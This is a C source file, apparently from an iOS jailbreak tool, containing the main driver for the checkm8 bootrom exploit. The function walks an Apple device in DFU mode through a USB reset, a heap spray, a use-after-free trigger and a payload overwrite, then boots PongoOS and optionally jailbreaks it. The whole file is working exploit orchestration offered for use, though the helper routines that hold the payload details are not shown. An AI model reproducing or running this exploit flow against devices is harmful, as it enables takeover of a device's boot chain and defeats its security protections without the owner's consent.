#include <exploit/exploit.h>

bool checkm8(usb_handle_t *handle, enum ExploitMode mode) {
    struct DeviceConfiguration deviceConfig;
    struct PayloadConfiguration payloadConfig;
    bool ret = false;
    int stage = STAGE_PREPARE;

    LOG(LOG_INFO, "Waiting for device in DFU mode...");
    while (stage != STAGE_DONE && wait_usb_handle(handle)) {
        if (stage == STAGE_PREPARE) {
            char *serialNumber = get_usb_device_serial_number(handle);
            if (!serialNumber) { goto finished; }
            if (!checkm8_find_device_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &deviceConfig)) { goto finished; }
            if (!checkm8_find_payload_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &payloadConfig)) { goto finished; }
            if (dfu_serial_number_is_in_yolo_dfu(serialNumber)) { LOG(LOG_INFO, "Found device in Yolo DFU mode!"); stage = STAGE_PONGO; goto yolodfu; }
            if (dfu_serial_number_is_pwned(serialNumber)) { LOG(LOG_ERROR, "Device is already pwned!"); return true; }
            if (!dfu_serial_number_is_in_dfu_mode(serialNumber)) { LOG(LOG_ERROR, "Device is not in DFU mode!"); return false; }
            free(serialNumber);
            stage = STAGE_RESET;
        }
        if (stage == STAGE_RESET) {
            LOG(LOG_VERBOSE, "Resetting device...");
            ret = checkm8_reset(handle);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Reset %s.", ret ? "succeeded" : "failed");
            stage = STAGE_HEAP_SPRAY;
        }
        else if (stage == STAGE_HEAP_SPRAY) {
            LOG(LOG_INFO, "Spraying the heap...");
            ret = checkm8_heap_feng_shui(handle, &deviceConfig);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Heap spray %s.", ret ? "succeeded" : "failed");
            stage = STAGE_TRIGGER;
        }
        else if (stage == STAGE_TRIGGER) {
            LOG(LOG_INFO, "Triggering UaF...");
            ret = checkm8_trigger_UaF(handle, &deviceConfig);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Trigger %s.", ret ? "succeeded" : "failed");
            stage = STAGE_PATCH;
        }
        else if (stage == STAGE_PATCH) {
            LOG(LOG_INFO, "Patching...");
            ret = checkm8_send_overwrite_and_payload(handle, &deviceConfig, &payloadConfig, mode == MODE_PONGOOS);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Patching %s.", ret ? "succeeded" : "failed");
            stage = mode == MODE_PONGOOS ? STAGE_PONGO : STAGE_DONE;
            close_usb_handle(handle);
            if (mode == MODE_PONGOOS) {
                sleep(3);
                LOG(LOG_INFO, "Please unplug and replug your device once the Apple logo is displayed.");
                wait_for_device_to_enter_yolo_dfu(handle);
            }
        }
        else if (stage == STAGE_PONGO) {
        yolodfu:
            LOG(LOG_INFO, "Sending PongoOS...");
            ret = send_pongo_to_yolo_dfu(handle);
            stage = (ret && args.jailbreak) ? STAGE_JAILBREAK : STAGE_DONE;
        }

        else if (stage == STAGE_JAILBREAK) {
            LOG(LOG_INFO, "Jailbreaking...");
            ret = pongo_jailbreak(handle);
            goto finished;
        }

        reset_usb_handle(handle);
    }
finished:
    if (ret) {
        LOG(LOG_SUCCESS, "%s succeeded.", mode == MODE_PONGOOS ? "Booting PongoOS" : "Exploit");
    } else {
        LOG(LOG_ERROR, "Exploit failed at stage %d!", stage == STAGE_PREPARE ? stage : stage - 1);
    }
    return ret;
}